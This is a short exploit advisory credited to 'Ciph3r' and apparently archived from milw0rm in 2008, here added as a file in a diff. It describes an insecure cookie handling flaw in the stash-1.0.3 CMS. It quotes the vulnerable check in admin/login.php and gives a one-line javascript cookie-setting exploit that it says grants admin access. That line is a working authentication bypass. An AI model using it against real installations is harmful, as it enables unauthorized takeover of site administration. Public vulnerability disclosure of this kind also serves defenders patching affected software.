@@ -1,0 +1,37 @@
+  ####################################################################################################
+  #                                                                                                  #
+  #           ...:::::stash-1.0.3 Insecure Cookie Handling Vulnerability ::::....                    #          
+  ###################################################################################################
+
+
+-----------------------
+Discoverd By : Ciph3r
+
+special tnx to : Iranian hacker & Kurdish Security TEAM
+
+E-Mail : Ciph3r_blackhat@yahoo.com
+
+cms :  http://sourceforge.net/project/showfiles.php?group_id=206129
+-----------------------
+DESCRIPTION:
+
+stash-1.0.3, suffers from insecure cookie handling, when a admin login is successfull the script creates
+a cookie to show the rest of the admin area the user is already logged in. the bad thing is the cookie doesnt
+contain any password or anything alike, therefor we can craft a admin cookie and make it look like we are
+logged in as a legit admin.
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+vuln code in  admin/login.php
+
+
+if(isset($_COOKIE['bsm'])&&isset($_COOKIE['msb'])){
+        $authenticate->checkCookie($_COOKIE['bsm'],$_COOKIE['msb']);
+
+
+-----------------------------------------
+exploit:
+javascript:document.cookie = "bsm=1; path=/"; 
+-----
+now you can get admin access and manage the cms ;)
+-------------------------------------------
+
+# milw0rm.com [2008-09-09]
